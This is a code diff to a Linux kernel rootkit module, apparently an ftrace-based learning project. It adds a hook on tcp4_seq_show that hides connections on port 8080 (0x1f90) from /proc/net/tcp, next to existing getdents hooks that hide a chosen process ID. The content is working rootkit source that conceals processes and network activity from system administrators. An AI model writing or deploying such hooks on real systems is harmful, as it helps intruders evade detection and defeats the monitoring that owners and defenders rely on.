@@ -5,6 +5,7 @@
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/version.h>
+#include <linux/tcp.h>
 
 #include "ftrace_helper.h"
 
@@ -21,12 +22,22 @@ char hide_pid[NAME_MAX];
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents)(const struct pt_regs *);
 
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
+   struct sock *sk = v;
+   if (sk != 0x1 && sk->sk_num == 0x1f90) return 0;
+
+   return orig_tcp4_seq_show(seq, v);
+}
+
+
 #include "getdents.include"
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
 static int __init rootkit_init(void){
